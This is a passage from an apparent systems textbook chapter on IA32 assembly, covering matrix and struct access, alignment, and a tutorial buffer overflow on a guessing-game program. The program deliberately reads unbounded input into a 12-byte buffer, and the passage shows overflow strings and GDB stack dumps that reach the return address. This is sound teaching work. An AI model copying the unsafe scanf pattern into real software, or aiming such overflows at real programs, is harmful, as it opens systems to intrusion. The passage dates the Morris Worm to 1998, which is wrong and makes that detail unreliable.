0x080484fa &lt;+77&gt;: mov  -0x4(%ebp),%eax          # copy i to %eax<br/>&#13;
0x080484fd &lt;+80&gt;: cmp  0xc(%ebp),%eax           # compare i with rows<br/>&#13;
0x08048500 &lt;+83&gt;: jl   0x80484c3 &lt;sumMatrix+22&gt; # if i&lt;rows goto&lt;sumMatrix+22&gt;<br/>&#13;
0x08048502 &lt;+85&gt;: mov  -0xc(%ebp),%eax          # copy total to %eax<br/>&#13;
0x08048505 &lt;+88&gt;: leave                         # prepare to leave function<br/>&#13;
0x08048506 &lt;+89&gt;: ret                           # return total</p>&#13;
<p class="indent">Again, the variables <span class="literal">i</span>, <span class="literal">j</span>, and <span class="literal">total</span> are at stack addresses <span class="literal">%ebp-4</span>, <span class="literal">%ebp-8</span>, and <span class="literal">%ebp-12</span>, respectively. The input parameters <span class="literal">m</span>, <span class="literal">row</span>, and <span class="literal">cols</span> are located at stack addresses <span class="literal">%ebp+8</span>, <span class="literal">%ebp+12</span>, and <span class="literal">%ebp+16</span>, respectively.</p>&#13;
<p class="indent">Let’s zoom in on the section that deals specifically with an access to element (<em>i</em>, <em>j</em>), or <span class="literal">matrix[i][j]</span>:</p>&#13;
<p class="programs">0x080484cc &lt;+31&gt;: mov -0x4(%ebp),%eax      # copy i to %eax<br/>&#13;
0x080484cf &lt;+34&gt;: lea 0x0(,%eax,4),%edx    # multiply i by 4, place in %edx<br/>&#13;
0x080484d6 &lt;+41&gt;: mov 0x8(%ebp),%eax       # copy matrix to %eax<br/>&#13;
0x080484d9 &lt;+44&gt;: add %edx,%eax            # add i*4 to matrix, place in %eax<br/>&#13;
0x080484db &lt;+46&gt;: mov (%eax),%eax          # copy matrix[i] to %eax</p>&#13;
<p class="indent">The five instructions between <span class="literal">&lt;sumMatrix+31&gt;</span> and <span class="literal">&lt;sumMatrix+46&gt;</span> compute <span class="literal">matrix[i]</span>, or <span class="literal">*(matrix+i)</span>. Note that the compiler needs to multiply <span class="literal">i</span> by four prior to adding it to <span class="literal">matrix</span> to calculate the correct offset (recall that pointers are four bytes in size). The instruction at <span class="literal">&lt;sumMatrix+46&gt;</span> then dereferences the calculated address to get the element <span class="literal">matrix[i]</span>.</p>&#13;
<p class="indent">Since <span class="literal">matrix</span> is an array of <span class="literal">int</span> pointers, the element located at <span class="literal">matrix[i]</span> is itself an <span class="literal">int</span> pointer. The <em>j</em>th element in <span class="literal">matrix[i]</span> is located at offset <em>j</em> × 4 in the <span class="literal">matrix[i]</span> array.</p>&#13;
<p class="indent">The next set of instructions extract the <em>j</em>th element in array <span class="literal">matrix[i]</span>:</p>&#13;
<p class="programs">0x080484dd &lt;+48&gt;: mov -0x8(%ebp),%edx    # copy j to %edx<br/>&#13;
0x080484e0 &lt;+51&gt;: shl $0x2,%edx          # multiply j by 4, place in %edx<br/>&#13;
0x080484e3 &lt;+54&gt;: add %edx,%eax          # add j*4 to matrix[i], place in %eax<br/>&#13;
<span epub:type="pagebreak" id="page_443"/>0x080484e5 &lt;+56&gt;: mov (%eax),%eax        # copy matrix[i][j] to %eax<br/>&#13;
0x080484e7 &lt;+58&gt;: add %eax,-0xc(%ebp)    # add matrix[i][j] to total</p>&#13;
<p class="indent">The first instruction in this snippet loads variable <span class="literal">j</span> into register <span class="literal">%edx</span>. The compiler uses the left shift (<span class="literal">shl</span>) instruction to multiply <span class="literal">j</span> by four and stores the result in register <span class="literal">%edx</span>. The compiler then adds the resulting value to the address located in <span class="literal">matrix[i]</span> to get the address of <span class="literal">matrix[i][j]</span>.</p>&#13;
<p class="indent">Let’s revisit <a href="ch08.xhtml#ch8fig10">Figure 8-10</a> and consider an example access to <span class="literal">M2[1][2]</span> For convenience, we reproduce the figure in <a href="ch08.xhtml#ch8fig11">Figure 8-11</a>:</p>&#13;
<div class="imagec" id="ch8fig11"><img alt="image" src="../images/08fig11.jpg"/></div>&#13;
<p class="figcap"><em>Figure 8-11: Matrix <span class="literal">M2</span>’s noncontiguous layout in memory</em></p>&#13;
<p class="indent">Note that <span class="literal">M2</span> starts at memory location <em>x</em><sub>0</sub>. The compiler first computes the address of <span class="literal">M2[1]</span> by multiplying 1 by 4 (<span class="literal">sizeof(int *)</span>) and adding it to the address of <span class="literal">M2</span> (<em>x</em><sub>0</sub>), yielding the new address <em>x</em><sub>4</sub>. A dereference of this address yields the address associated with <span class="literal">M2[1]</span>, or <em>x</em><sub>36</sub>. The compiler then multiplies index 2 by 4 (<span class="literal">sizeof(int)</span>), and adds the result (8) to <em>x</em><sub>36</sub>, yielding a final address of <em>x</em><sub>44</sub>. The address <em>x</em><sub>44</sub> is dereferenced, yielding the value 5. Sure enough, the element in <a href="ch08.xhtml#ch8fig11">Figure 8-11</a> that corresponds to <span class="literal">M2[1][2]</span> has the value 5.</p>&#13;
<h3 class="h3" id="lev1_70">8.9 structs in Assembly</h3>&#13;
<p class="noindent">A <span class="literal">struct</span> (see “C Structs” on <a href="ch02.xhtml#lev1_15">page 103</a>) is another way to create a collection of data types in C. Unlike arrays, structs enable different data types to be grouped together. C stores a <span class="literal">struct</span> like a single-dimension array, where the data elements (fields) are stored contiguously.</p>&#13;
<p class="indent">Let’s revisit the <span class="literal">struct studentT</span> from <a href="ch01.xhtml#ch01">Chapter 1</a>:</p>&#13;
<p class="programs">struct studentT {<br/>&#13;
    char name[64];<br/>&#13;
    int  age;<br/>&#13;
    int  grad_yr;<br/>&#13;
    float gpa;<br/>&#13;
};<br/>&#13;
<br/>&#13;
struct studentT student;</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_444"/><a href="ch08.xhtml#ch8fig12">Figure 8-12</a> shows how <span class="literal">student</span> is laid out in memory. For the sake of example, assume that <span class="literal">student</span> starts at address <em>x</em><sub>0</sub>. Each <em>x</em><sub><em>i</em></sub> denotes the address of a field.</p>&#13;
<div class="imagec" id="ch8fig12"><img alt="image" src="../images/08fig12.jpg"/></div>&#13;
<p class="figcap"><em>Figure 8-12: The memory layout of <span class="literal">struct studentT</span></em></p>&#13;
<p class="indent">The fields are stored contiguously next to one another in memory in the order in which they are declared. In <a href="ch08.xhtml#ch8fig12">Figure 8-12</a>, the <span class="literal">age</span> field is allocated at the memory location directly after the <span class="literal">name</span> field (at byte offset <em>x</em><sub>64</sub>) and is followed by the <span class="literal">grad_yr</span> (byte offset <em>x</em><sub>68</sub>) and <span class="literal">gpa</span> (byte offset <em>x</em><sub>72</sub>) fields. This organization enables memory-efficient access to the fields.</p>&#13;
<p class="indent">To understand how the compiler generates assembly code to work with a <span class="literal">struct</span>, consider the function <span class="literal">initStudent</span>:</p>&#13;
<p class="programs">void initStudent(struct studentT *s, char *nm, int ag, int gr, float g) {<br/>&#13;
    strncpy(s-&gt;name, nm, 64);<br/>&#13;
    s-&gt;grad_yr = gr;<br/>&#13;
    s-&gt;age = ag;<br/>&#13;
    s-&gt;gpa = g;<br/>&#13;
}</p>&#13;
<p class="indent">The <span class="literal">initStudent</span> function uses the base address of a <span class="literal">struct studentT</span> as its first parameter, and the desired values for each field as its remaining parameters. The listing that follows depicts this function in assembly. In general, parameter <em>i</em> to function <span class="literal">initStudent</span> is located at stack address <span class="literal">(ebp+8)</span> + 4 × <em>i</em>.</p>&#13;
<p class="programs">&lt;initStudent&gt;:<br/>&#13;
 &lt;+0&gt;:   push  %ebp                     # save ebp<br/>&#13;
 &lt;+1&gt;:   mov   %esp,%ebp                # update ebp (new stack frame)<br/>&#13;
 &lt;+3&gt;:   sub   $0x18,%esp               # add 24 bytes to stack frame<br/>&#13;
 &lt;+6&gt;:   mov   0x8(%ebp),%eax           # copy first parameter (s) to eax<br/>&#13;
 &lt;+9&gt;:   mov   0xc(%ebp),%edx           # copy second parameter (nm) to edx<br/>&#13;
 &lt;+12&gt;   mov   $0x40,0x8(%esp)          # copy 0x40 (or 64) to esp+8<br/>&#13;
 &lt;+16&gt;:  mov   %edx,0x4(%esp)           # copy nm to esp+4<br/>&#13;
 &lt;+20&gt;:  mov   %eax,(%esp)              # copy s to top of stack (esp)<br/>&#13;
 &lt;+23&gt;:  call  0x8048320 &lt;strncpy@plt&gt;  # call strncpy(s-&gt;name, nm, 64)<br/>&#13;
 &lt;+28&gt;:  mov   0x8(%ebp),%eax           # copy s to eax<br/>&#13;
 &lt;+32&gt;:  mov   0x14(%ebp),%edx          # copy fourth parameter (gr) to edx<br/>&#13;
 &lt;+35&gt;:  mov   %edx,0x44(%eax)          # copy gr to offset eax+68 (s-&gt;grad_yr)<br/>&#13;
 &lt;+38&gt;:  mov   0x8(%ebp),%eax           # copy s to eax<br/>&#13;
 &lt;+41&gt;:  mov   0x10(%ebp),%edx          # copy third parameter (ag) to edx<br/>&#13;
 &lt;+44&gt;:  mov   %edx,0x40(%eax)          # copy ag to offset eax+64 (s-&gt;age)<br/>&#13;
 &lt;+47&gt;:  mov   0x8(%ebp),%edx           # copy s to edx<br/>&#13;
 &lt;+50&gt;:  mov   0x18(%ebp),%eax          # copy g to eax<br/>&#13;
 &lt;+53&gt;:  mov   %eax,0x48(%edx)          # copy g to offset edx+72 (s-&gt;gpa)<br/>&#13;
 &lt;+56&gt;:  leave                          # prepare to leave the function<br/>&#13;
<span epub:type="pagebreak" id="page_445"/>&#13;
 &lt;+57&gt;:  ret                            # return</p>&#13;
<p class="indent">Being mindful of the byte offsets of each field is key to understanding this code. Here are a few things to keep in mind.</p>&#13;
<p class="indent">The <span class="literal">strncpy</span> call takes the base address of the <span class="literal">name</span> field of <span class="literal">s</span>, the address of array <span class="literal">nm</span>, and a length specifier as its three arguments. Recall that because <span class="literal">name</span> is the first field in <span class="literal">struct studentT</span>, the address of <span class="literal">s</span> is synonymous with the address of <span class="literal">s-&gt;name</span>.</p>&#13;
<p class="programs"> &lt;+6&gt;:   mov   0x8(%ebp),%eax           # copy first parameter (s) to eax<br/>&#13;
 &lt;+9&gt;:   mov   0xc(%ebp),%edx           # copy second parameter (nm) to edx<br/>&#13;
 &lt;+12&gt;   mov   $0x40,0x8(%esp)          # copy 0x40 (or 64) to esp+8<br/>&#13;
 &lt;+16&gt;:  mov   %edx,0x4(%esp)           # copy nm to esp+4<br/>&#13;
 &lt;+20&gt;:  mov   %eax,(%esp)              # copy s to top of stack (esp)<br/>&#13;
 &lt;+23&gt;:  call  0x8048320 &lt;strncpy@plt&gt;  # call strncpy(s-&gt;name, nm, 64)</p>&#13;
<p class="indent">The next part (instructions <span class="literal">&lt;initStudent+28&gt;</span> through <span class="literal">&lt;initStudent+35&gt;</span>) places the value of the <span class="literal">gr</span> parameter at an offset of 68 from the start of <span class="literal">s</span>. Revisiting the memory layout in <a href="ch08.xhtml#ch8fig12">Figure 8-12</a> shows that this address corresponds to <span class="literal">s-&gt;grad_yr</span>.</p>&#13;
<p class="programs"> &lt;+28&gt;:  mov   0x8(%ebp),%eax           # copy s to eax<br/>&#13;
 &lt;+32&gt;:  mov   0x14(%ebp),%edx          # copy fourth parameter (gr) to edx<br/>&#13;
 &lt;+35&gt;:  mov   %edx,0x44(%eax)          # copy gr to offset eax+68 (s-&gt;grad_yr</p>&#13;
<p class="indent">The next section (instructions <span class="literal">&lt;initStudent+38&gt;</span> through <span class="literal">&lt;initStudent+53&gt;</span>) copies the <span class="literal">ag</span> parameter to the <span class="literal">s-&gt;age</span> field. Afterward, the <span class="literal">g</span> parameter value is copied to the <span class="literal">s-&gt;gpa</span> field (byte offset 72):</p>&#13;
<p class="programs"> &lt;+38&gt;:  mov   0x8(%ebp),%eax           # copy s to eax<br/>&#13;
 &lt;+41&gt;:  mov   0x10(%ebp),%edx          # copy third parameter (ag) to edx<br/>&#13;
 &lt;+44&gt;:  mov   %edx,0x40(%eax)          # copy ag to offset eax+64 (s-&gt;age)<br/>&#13;
 &lt;+47&gt;:  mov   0x8(%ebp),%edx           # copy s to edx<br/>&#13;
 &lt;+50&gt;:  mov   0x18(%ebp),%eax          # copy g to eax<br/>&#13;
 &lt;+53&gt;:  mov   %eax,0x48(%edx)          # copy g to offset edx+72 (s-&gt;gpa)</p>&#13;
<h4 class="h4" id="lev2_156">8.9.1 Data Alignment and structs</h4>&#13;
<p class="noindent">Consider the following modified declaration of <span class="literal">struct studentT</span>:</p>&#13;
<p class="programs">struct studentTM {<br/>&#13;
    char name[63]; //updated to 63 instead of 64<br/>&#13;
    int  age;<br/>&#13;
    int  grad_yr;<br/>&#13;
    float gpa;<br/>&#13;
};<br/>&#13;
<br/>&#13;
struct studentTM student2;</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_446"/>The size of the <span class="literal">name</span> field is modified to be 63 bytes, instead of the original 64. Consider how this affects the way the <span class="literal">struct</span> is laid out in memory. It may be tempting to visualize it as in <a href="ch08.xhtml#ch8fig13">Figure 8-13</a>.</p>&#13;
<div class="imagec" id="ch8fig13"><img alt="image" src="../images/08fig13.jpg"/></div>&#13;
<p class="figcap"><em>Figure 8-13: An incorrect memory layout for the updated <span class="literal">struct</span> <span class="literal">studentTM</span>. Note that the <span class="literal">name</span> field is reduced from 64 to 63 bytes.</em></p>&#13;
<p class="indent">In this depiction, the <span class="literal">age</span> field occupies the byte immediately following the <span class="literal">name</span> field. But this is incorrect. <a href="ch08.xhtml#ch8fig14">Figure 8-14</a> depicts the actual layout in memory.</p>&#13;
<div class="imagec" id="ch8fig14"><img alt="image" src="../images/08fig14.jpg"/></div>&#13;
<p class="figcap"><em>Figure 8-14: The correct memory layout for the updated <span class="literal">struct</span> <span class="literal">studentTM</span>. Byte <em>x</em><sub>63</sub> is added by the compiler to satisfy memory alignment constraints, but it doesn’t correspond to any of the fields.</em></p>&#13;
<p class="indent">IA32’s alignment policy requires that two-byte data types (i.e., <span class="literal">short</span>) reside at a two-byte-aligned address, whereas four-byte data types (<span class="literal">int</span>, <span class="literal">float</span>, <span class="literal">long</span>, and pointer types) reside at four-byte-aligned addresses, and eight-byte data types (<span class="literal">double</span>, <span class="literal">long long</span>) reside at eight-byte-aligned addresses. For a <span class="literal">struct</span>, the compiler adds empty bytes as <em>padding</em> between fields to ensure that each field satisfies its alignment requirements. For example, in the <span class="literal">struct</span> declared in the previous code snippet, the compiler adds a byte of empty space (or padding) at byte <em>x</em><sub>63</sub> to ensure that the <span class="literal">age</span> field starts at an address that is at a multiple of four. Values aligned properly in memory can be read or written in a single operation, enabling greater efficiency.</p>&#13;
<p class="indent">Consider what happens when a <span class="literal">struct</span> is defined as follows:</p>&#13;
<p class="programs">struct studentTM {<br/>&#13;
    int  age;<br/>&#13;
    int  grad_yr;<br/>&#13;
    float gpa;<br/>&#13;
    char name[63];<br/>&#13;
};<br/>&#13;
<br/>&#13;
struct studentTM student3;</p>&#13;
<p class="indent">Moving the <span class="literal">name</span> array to the end ensures that <span class="literal">age</span>, <span class="literal">grad_yr</span>, and <span class="literal">gpa</span> are four-byte aligned. Most compilers will remove the filler byte at the end of the <span class="literal">struct</span>. However, if the <span class="literal">struct</span> is ever used in the context of an array (e.g., <span class="literal">struct studentTM courseSection[20];</span>) the compiler will again add the filler byte as padding between each <span class="literal">struct</span> in the array to ensure that alignment requirements are properly met.</p>&#13;
<h3 class="h3" id="lev1_71"><span epub:type="pagebreak" id="page_447"/>8.10 Real World: Buffer Overflow</h3>&#13;
<p class="noindent">The C language does not perform automatic array bounds checking. Accessing memory outside of the bounds of an array is problematic and often results in errors such as segmentation faults. However, a clever attacker can inject malicious code that intentionally overruns the boundary of an array (also known as a <em>buffer</em>) to force the program to execute in an unintended manner. In the worst cases, the attacker can run code that allows them to gain <em>root privilege</em>, or OS-level access to the computer system. A piece of software that takes advantage of the existence of a known buffer overrun error in a program is known as a <em>buffer overflow exploit</em>.</p>&#13;
<p class="indent">In this section, we use GDB and assembly language to fully characterize the mechanics of a buffer overflow exploit. Prior to reading this chapter we encourage you to explore “Debugging Assembly Code” on <a href="ch03.xhtml#lev1_24">page 177</a>.</p>&#13;
<h4 class="h4" id="lev2_157">8.10.1 Famous Examples of Buffer Overflow</h4>&#13;
<p class="noindent">Buffer overflow exploits emerged in the 1980s and remained a chief scourge of the computing industry through the early parts of the 2000s. While many modern operating systems have protections against the simplest buffer overflow attacks, careless programming errors can still leave modern programs wide open to attack. Buffer overflow exploits have recently been discovered in Skype,<sup><a href="ch08.xhtml#fn8_3" id="rfn8_3">3</a></sup> Android,<sup><a href="ch08.xhtml#fn8_4" id="rfn8_4">4</a></sup> Google Chrome,<sup><a href="ch08.xhtml#fn8_5" id="rfn8_5">5</a></sup> and others. Here are some notable historic examples of buffer overflow exploits.</p>&#13;
<h5 class="h5" id="lev3_70">The Morris Worm</h5>&#13;
<p class="noindent">The Morris Worm<sup><a href="ch08.xhtml#fn8_6" id="rfn8_6">6</a></sup> was released in 1998 on ARPANet from MIT (to hide that it was written by a student at Cornell) and exploited a buffer overrun vulnerability that existed in the Unix finger daemon (<span class="literal">fingerd</span>). In Linux and other Unix-like systems, a <em>daemon</em> is a type of process that continuously executes in the background, usually performing clean-up and monitoring tasks. The <span class="literal">fingerd</span> daemon returns a user-friendly report on a computer or person. Most crucially, the worm had a replication mechanism that caused it to be sent to the same computer multiple times, bogging down the system to an unusable state. Even though the author claimed that the worm was meant as a harmless intellectual exercise, the replication mechanism enabled the worm to spread easily and made it difficult to remove. In future years, other worms would employ buffer overflow exploits to gain unauthorized access into systems. Notable examples include Code Red (2001), MS-SQLSlammer (2003), and W32/Blaster (2003).</p>&#13;
<h5 class="h5" id="lev3_71">AOL Chat Wars</h5>&#13;
<p class="noindent">David Auerbach,<sup><a href="ch08.xhtml#fn8_7" id="rfn8_7">7</a></sup> a former Microsoft engineer, detailed his experience with a buffer overflow during his efforts to integrate Microsoft’s Messenger Service (MMS) with AOL Instant Messenger in the late 1990s. Back then, AOL Instant Messenger (AIM) was <em>the</em> service to use if you wanted to instant message (or IM) friends and family. Microsoft tried to gain a foothold in this market by designing a feature in MMS that enabled MMS users to talk to <span epub:type="pagebreak" id="page_448"/>their AIM “buddies.” Displeased, AOL patched their servers so that MMS could no longer connect to them. Microsoft engineers figured out a way for MMS clients to mimic the messages sent by AIM clients to AOL servers, making it difficult for AOL to distinguish between messages received by MMS and AIM. AOL responded by changing the way AIM sent messages, and MMS engineers duly changed their client’s messages to once again match AIM’s. This “chat war” continued until AOL started using a buffer overflow error <em>in their own client</em> to verify that sent messages came from AIM clients. Since MMS clients did not have the same vulnerability, the chat wars ended, with AOL as the victor.</p>&#13;
<h4 class="h4" id="lev2_158">8.10.2 A First Look: The Guessing Game</h4>&#13;
<p class="noindent">To help you understand the mechanism of the buffer overflow attack, we provide a 32-bit executable of a simple program that enables the user to play a guessing game with the program. Download the <span class="literal">secret</span> executable<sup><a href="ch08.xhtml#fn8_8" id="rfn8_8">8</a></sup> and extract it using the <span class="literal">tar</span> command:</p>&#13;
<p class="programs">$ <span class="codestrong1">tar -xzvf secret.tar.gz</span></p>&#13;
<p class="indent">Here, we provide a copy of the main file associated with the executable:</p>&#13;
<p class="margnote">main.c</p>&#13;
<p class="programs">#include &lt;stdio.h&gt;<br/>&#13;
#include &lt;stdlib.h&gt;<br/>&#13;
#include "other.h" //contains secret function definitions<br/>&#13;
<br/>&#13;
/*prints out the You Win! message*/<br/>&#13;
void endGame(void) {<br/>&#13;
    printf("You win!\n");<br/>&#13;
    exit(0);<br/>&#13;
}<br/>&#13;
<br/>&#13;
/*main function of the game*/<br/>&#13;
int main() {<br/>&#13;
    int guess, secret, len;<br/>&#13;
    char buf[12]; //buffer (12 bytes long)<br/>&#13;
<br/>&#13;
    printf("Enter secret number:\n");<br/>&#13;
    scanf("%s", buf); //read guess from user input<br/>&#13;
    guess = atoi(buf); //convert to an integer<br/>&#13;
<br/>&#13;
    secret = getSecretCode(); //call the getSecretCode() function<br/>&#13;
<br/>&#13;
    //check to see if guess is correct<br/>&#13;
    if (guess == secret) {<br/>&#13;
        printf("You got it right!\n");<br/>&#13;
    }<br/>&#13;
    else {<br/>&#13;
<span epub:type="pagebreak" id="page_449"/>&#13;
        printf("You are so wrong!\n");<br/>&#13;
        return 1; //if incorrect, exit<br/>&#13;
    }<br/>&#13;
<br/>&#13;
    printf("Enter the secret string to win:\n");<br/>&#13;
    scanf("%s", buf); //get secret string from user input<br/>&#13;
<br/>&#13;
    guess = calculateValue(buf, strlen(buf)); //call calculateValue function<br/>&#13;
<br/>&#13;
    //check to see if guess is correct<br/>&#13;
    if (guess != secret){<br/>&#13;
        printf("You lose!\n");<br/>&#13;
        return 2; //if guess is wrong, exit<br/>&#13;
    }<br/>&#13;
<br/>&#13;
    /*if both the secret string and number are correct<br/>&#13;
    call endGame()*/<br/>&#13;
    endGame();<br/>&#13;
<br/>&#13;
    return 0;<br/>&#13;
}</p>&#13;
<p class="indent">This game prompts the user to enter first a secret number and then a secret string to win the guessing game. The header file <span class="literal">other.h</span> contains the definition of the <span class="literal">getSecretCode</span> and <span class="literal">calculateValue</span> functions, but it is unavailable to us. How then can a user beat the program? Brute forcing the solution will take too long. One strategy is to analyze the <span class="literal">secret</span> executable in GDB and step through the assembly to reveal the secret number and string. The process of examining assembly code to reveal knowledge of how it works is commonly referred to as <em>reverse engineering</em>. Readers comfortable enough with GDB and reading assembly should be able to use GDB to reverse engineer the secret number and the secret string.</p>&#13;
<p class="indent">However, there is a different, sneakier way to win.</p>&#13;
<h4 class="h4" id="lev2_159">8.10.3 Taking a Closer Look (Under the C)</h4>&#13;
<p class="noindent">The program contains a potential buffer overrun vulnerability at the first call to <span class="literal">scanf</span>. To understand what is going on, let’s inspect the assembly code of the <span class="literal">main</span> function using GDB. Let’s also place a breakpoint at address 0x0804859f, which is the address of the instruction immediately before the call to <span class="literal">scanf</span> (placing the breakpoint at the address of <span class="literal">scanf</span> causes program execution to halt <em>inside</em> the call to <span class="literal">scanf</span>, not in <span class="literal">main</span>).</p>&#13;
<p class="programs">   0x08048582 &lt;+0&gt;:     push   %ebp<br/>&#13;
   0x08048583 &lt;+1&gt;:     mov    %esp,%ebp<br/>&#13;
   0x08048588 &lt;+6&gt;:     sub    $0x38,%esp<br/>&#13;
   0x0804858b &lt;+9&gt;:     movl   $0x8048707,(%esp)<br/>&#13;
   0x08048592 &lt;+16&gt;:    call   0x8048390 &lt;printf@plt&gt;<br/>&#13;
<span epub:type="pagebreak" id="page_450"/>&#13;
   0x08048597 &lt;+21&gt;:    lea    0x1c(%esp),%eax<br/>&#13;
   0x0804859b &lt;+25&gt;:    mov    %eax,0x4(%esp)<br/>&#13;
=&gt; 0x0804859f &lt;+29&gt;:    movl   $0x804871c,(%esp)<br/>&#13;
   0x080485a6 &lt;+36&gt;:    call   0x80483e0 &lt;scanf@plt&gt;</p>&#13;
<p class="indent"><a href="ch08.xhtml#ch8fig15">Figure 8-15</a> depicts the stack immediately before the call to <span class="literal">scanf</span>.</p>&#13;
<div class="imagec" id="ch8fig15"><img alt="image" src="../images/08fig15.jpg"/></div>&#13;
<p class="figcap"><em>Figure 8-15: The call stack immediately before the call to <span class="literal">scanf</span></em></p>&#13;
<p class="indent">Prior to the call to <span class="literal">scanf</span>, the arguments for <span class="literal">scanf</span> are preloaded onto the stack, with the first argument at the top of the stack, and the second argument one address below. The <span class="literal">lea</span> instruction at location <span class="literal">&lt;main+21&gt;</span> creates the reference for array <span class="literal">buf</span>.</p>&#13;
<p class="indent">Now, suppose that the user enters <span class="literal">12345678</span> at the prompt. <a href="ch08.xhtml#ch8fig16">Figure 8-16</a> illustrates what the stack looks like immediately after the call to <span class="literal">scanf</span> completes.</p>&#13;
<div class="imagec" id="ch8fig16"><span epub:type="pagebreak" id="page_451"/><img alt="image" src="../images/08fig16.jpg"/></div>&#13;
<p class="figcap"><em>Figure 8-16: The call stack immediately after the call to <span class="literal">scanf</span> with input <span class="literal">12345678</span></em></p>&#13;
<p class="indent">Recall that the hex values for the ASCII encodings of the digits 0 to 9 are 0x30 to 0x39, and that each stack memory location is four bytes long. The frame pointer is 56 bytes away from the stack pointer. Readers tracing along can confirm the value of <span class="literal">%ebp</span> by using GDB to print its value (<span class="literal">p</span> <span class="literal">$ebp</span>). In the example shown, the value of <span class="literal">%ebp</span> is 0xffffd428. The following command allows the reader to inspect the 64 bytes (in hex) below register <span class="literal">%esp</span>:</p>&#13;
<p class="programs">(gdb) <span class="codestrong1">x /64bx $esp</span></p>&#13;
<p class="indent">This GDB command yields output that looks similar to the following:</p>&#13;
<p class="programs">0xffffd3f0:     0x1c    0x87    0x04    0x08    0x0c    0xd4    0xff    0xff<br/>&#13;
0xffffd3f8:     0x00    0xa0    0x04    0x08    0xb2    0x86    0x04    0x08<br/>&#13;
0xffffd400:     0x01    0x00    0x00    0x00    0xc4    0xd4    0xff    0xff<br/>&#13;
0xffffd408:     0xcc    0xd4    0xff    0xff    0x31    0x32    0x33    0x34<br/>&#13;
0xffffd410:     0x35    0x36    0x37    0x38    0x00    0x80    0x00    0x00<br/>&#13;
0xffffd418:     0x6b    0x86    0x04    0x08    0x00    0x80    0xfb    0xf7<br/>&#13;
0xffffd420:     0x60    0x86    0x04    0x08    0x00    0x00    0x00    0x00<br/>&#13;
0xffffd428:     0x00    0x00    0x00    0x00    0x43    0x5a    0xe1    0xf7</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_452"/>Each line represents two 32-bit words. So, the first line represents the words at addresses 0xffffd3f0 and 0xffffd3f4. Looking at the top of the stack, we can see the memory address associated with the string <span class="literal">"%s"</span> (or 0x0804871c) followed by the address of <span class="literal">buf</span> (or 0xffffd40c). Note that the address for <span class="literal">buf</span> is simply represented as 0x40c in the figures in this section.</p>&#13;
<p class="note"><strong><span class="black">Note</span> MULTIBYTE VALUES ARE STORED IN LITTLE-ENDIAN ORDER</strong></p>&#13;
<p class="note1">In the preceding assembly segment, the byte at address 0xfffffd3f0 is 0x1c, the byte at address 0xfffffd3f1 is 0x87, the byte at address 0xfffffd3f2 is 0x04, and the byte at address 0xfffffd3f3 is 0x08. However, the 32-bit <em>value</em> (which corresponds to the memory address of the string <span class="literal">"%s"</span>) at address 0xfffffd3f0 is in fact 0x0804871c. Remember that because x86 is a little-endian system (see “Integer Byte Order on <a href="ch04.xhtml#lev1_34">page 224</a>), the bytes for multibyte values such as addresses are stored in reverse order. Similarly, the bytes corresponding to the address of array <span class="literal">buf</span> (0xffffd40c) are stored in reverse order at address 0xfffffd3f4.</p>&#13;
<p class="indent">The bytes associated with address 0xffffd40c are located on the same line as those associated with address 0xffffd408 and are the second word on that line. Since the <span class="literal">buf</span> array is 12 bytes long, the elements associated with <span class="literal">buf</span> span the 12 bytes from address 0xffffd40c to 0xffffd417. Inspecting the bytes at those addresses yields:</p>&#13;
<p class="programs">0xffffd408:     0xcc    0xd4    0xff    0xff    0x31    0x32    0x33    0x34<br/>&#13;
0xffffd410:     0x35    0x36    0x37    0x38    0x00    0x80    0x00    0x00</p>&#13;
<p class="indent">At these locations, we can clearly see the hex representation of the input string 12345678. The null termination byte <span class="literal">\0</span> appears in the leftmost byte location at address 0xffffd414. Recall that <span class="literal">scanf</span> terminates all strings with a null byte.</p>&#13;
<p class="indent">Of course, 12345678 is not the secret number. Here is the output when we try to run <span class="literal">secret</span> with input string 12345678:</p>&#13;
<p class="programs">$ <span class="codestrong1">./secret</span><br/>&#13;
Enter secret number:<br/>&#13;
<span class="codestrong1">12345678</span><br/>&#13;
You are so wrong!<br/>&#13;
$ <span class="codestrong1">echo $?</span><br/>&#13;
1</p>&#13;
<p class="indent">The <span class="literal">echo $?</span> command prints out the return value of the last executed command in the shell. In this case, the program returned 1 because the secret number we entered is wrong. Recall that by convention, programs return 0 when there are no errors. Our goal going forward is to trick the program to exit with a return value of 0, indicating that we won the game.</p>&#13;
<h4 class="h4" id="lev2_160">8.10.4 Buffer Overflow: First Attempt</h4>&#13;
<p class="noindent">Next, let’s try typing in the string <span class="codestrong">1234567890123456789012345678901234</span>:</p>&#13;
<span epub:type="pagebreak" id="page_453"/>&#13;
<p class="programs">$ <span class="codestrong1">./secret</span><br/>&#13;
Enter secret number:<br/>&#13;
<span class="codestrong1">1234567890123456789012345678901234</span><br/>&#13;
You are so wrong!<br/>&#13;
Segmentation fault (core dumped)<br/>&#13;
$ <span class="codestrong1">echo $?</span><br/>&#13;
139</p>&#13;
<p class="indent">Interesting! Now the program crashes with a segmentation fault, with return code 139. <a href="ch08.xhtml#ch8fig17">Figure 8-17</a> shows what the call stack for <span class="literal">main</span> looks like immediately after the call to <span class="literal">scanf</span> with this new input.</p>&#13;
<div class="imagec" id="ch8fig17"><img alt="image" src="../images/08fig17.jpg"/></div>&#13;
<p class="figcap"><em>Figure 8-17: The call stack immediately after the call to <span class="literal">scanf</span> with input 1234567890123456789012345678901234</em></p>&#13;
<p class="indent">The input string is so long that it not only overwrote the value stored at address 0x428, but it spilled over into the return address below the stack frame for <span class="literal">main</span>. Recall that when a function returns, the program tries to resume execution at the address specified by the return address. In this example, the program tries to resume execution at address 0xf7003433 after exiting <span class="literal">main</span>, which does not exist. So the program crashes with a segmentation fault.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_454"/>Rerunning the program in GDB (<span class="literal">input.txt</span> contains the input string above) reveals this devilry in action:</p>&#13;
<p class="programs">$ <span class="codestrong1">gdb secret</span><br/>&#13;
(gdb) <span class="codestrong1">break *0x804859b</span><br/>&#13;
(gdb) <span class="codestrong1">ni</span><br/>&#13;
(gdb) <span class="codestrong1">run &lt; input.txt</span><br/>&#13;
(gdb) <span class="codestrong1">x /64bx $esp</span><br/>&#13;
0xffffd3f0:     0x1c    0x87    0x04    0x08    0x0c    0xd4    0xff    0xff<br/>&#13;
0xffffd3f8:     0x00    0xa0    0x04    0x08    0xb2    0x86    0x04    0x08<br/>&#13;
